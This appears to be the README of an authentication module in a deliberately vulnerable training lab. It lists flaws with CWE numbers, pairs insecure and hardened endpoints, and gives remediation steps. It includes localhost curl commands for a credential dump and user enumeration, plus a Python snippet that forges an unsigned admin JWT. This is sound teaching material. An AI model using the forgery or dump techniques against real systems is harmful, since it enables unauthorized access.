# 01 · Authentication, sessions and tokens

Checklist section: **§1 Authentication, sessions, tokens** · Module: `m01-authentication` · Port: **8081**
PoC: [`attacks/01-authentication.sh`](../attacks/01-authentication.sh) · Run: `scripts/run-module.sh m01-authentication`

## What this module demonstrates

| # | Vulnerability | CWE | Insecure | Hardened |
|---|---------------|-----|----------|----------|
| 1 | Unsalted MD5 password storage, dumped without auth | CWE-916, CWE-916 | `GET /vuln1/debug/users`, `POST /vuln1/register` | `POST /safe1/register` (BCrypt cost 12) |
| 2 | Login brute force, no throttling, user enumeration | CWE-307, CWE-204 | `POST /vuln1/login` | `POST /safe1/login` (429 + generic answer) |
| 3 | Session fixation (pre-auth id survives login) | CWE-384 | `GET /vuln1/session-id`, `POST /vuln1/login` | `POST /safe1/login` (session destroyed + recreated) |
| 4 | Cookie without `HttpOnly` / `Secure` | CWE-1004, CWE-614 | `POST /vuln1/set-cookie-demo` | `application.yml` (safe profile values documented) |
| 5 | JWT `alg: none` accepted | CWE-347 | `POST /vuln1/token/verify` | `SafeTokenService` (algorithm is a constant) |
| 6 | JWT HMAC secret is a dictionary word | CWE-321, CWE-521 | `application.yml` `vulnrange.m01.jwt-weak-secret` | key from env/Vault, ≥256 bit, ephemeral fallback |
| 7 | No `exp`/`iss`/`aud` validation, non-constant-time compare | CWE-613, CWE-208 | `InsecureTokenService#verify` | `SafeTokenService#verify` |
| 8 | Predictable reset code (`java.util.Random`, minute seed) | CWE-330 | `POST /vuln1/password-reset` | `POST /safe1/password-reset` (SecureRandom 8 digits, digest stored, 5 min TTL, single use) |
| 9 | Remember-me token from a static compiled-in key | CWE-798 | `GET /vuln1/remember-me/{u}`, `POST /vuln1/remember-me/login` | — (see "What is not implemented") |
| 10 | Privileged endpoint guarded by the broken token check | CWE-863 | `GET /vuln1/admin/espd-summary` | `GET /safe1/admin/espd-summary` |

## Reproduce

```bash
scripts/run-module.sh m01-authentication      # or scripts/run-all.sh
attacks/01-authentication.sh
```

The three attacks worth running by hand:

```bash
# 1. credential dump
curl -s http://127.0.0.1:8081/vuln1/debug/users

# 2. forgery without any secret (alg=none)
TOKEN="$(python3 - <<'PY'
import base64, json
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
print(f"{b64({'alg':'none'})}.{b64({'role':'ADMIN','sub':'attacker'})}.")
PY
)"
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8081/vuln1/admin/espd-summary

# 3. enumeration
curl -s -X POST -H 'Content-Type: application/json' \
     -d '{"username":"nobody","password":"x"}' http://127.0.0.1:8081/vuln1/login
```

The same calls against `/safe1/**` are rejected or, in the login case, rotated: the response shows
`"sessionRotatedFrom": "<old id>"` while the effective session is a new one.

## Fix, in the order that matters

1. **Password storage.** Argon2id (`Argon2PasswordEncoder`) or BCrypt with a tuned work factor.
   Never MD5/SHA-1/SHA-256 for passwords: fast digests are for integrity, not for secrets.
2. **Tokens.** Pin the algorithm in code (`ACCEPTED_ALG`), validate `iss`/`aud`/`exp`/`nbf`, compare
   MACs with `MessageDigest.isEqual`, keep the key in Vault/env and rotate it. In a platform with an
   IdP, use `spring-boot-starter-oauth2-resource-server` and let the IdP own key material entirely.
3. **Sessions.** On authentication: invalidate the old session and issue a new one (Spring Security:
   `sessionFixation().migrateSession()`). Cookie: `HttpOnly`, `Secure`, `SameSite=Lax|Strict`, idle
   and absolute timeouts.
4. **Brute force and enumeration.** Throttle per account *and* per source address, answer with one
   message and one timing profile whether or not the account exists.
5. **Recovery codes and remember-me.** `SecureRandom` only, store a digest, expire quickly, single
   use, bind to the account. Remember-me: derive from a per-user rotating secret or drop the feature.
6. **Audit.** Log `login_ok`, `login_failed`, `login_throttled`, `password_changed` with masked
   subjects (see `GET /safe1/audit`).

## What is *not* implemented here, and why

* A working remember-me forgery: the vulnerable endpoint mints the token for you. Minting it offline
  from the sources is the same arithmetic — no need for a second script.
* Real OAuth2/OIDC flows against an external provider: they need a provider and secrets. The rule
  stays the same: exact `redirect_uri` matching, `state` + `nonce` enforced, short-lived access tokens,
  rotating refresh tokens.

## Where this appears in real reviews

`permitAll()` on `/debug/**`, "temporary" user dumps, `alg`-agnostic JWT libraries, secrets in
`application.yml`, and session ids that never change after login. All five are visible in a diff if
the reviewer knows what to look for — which is the point of this module.
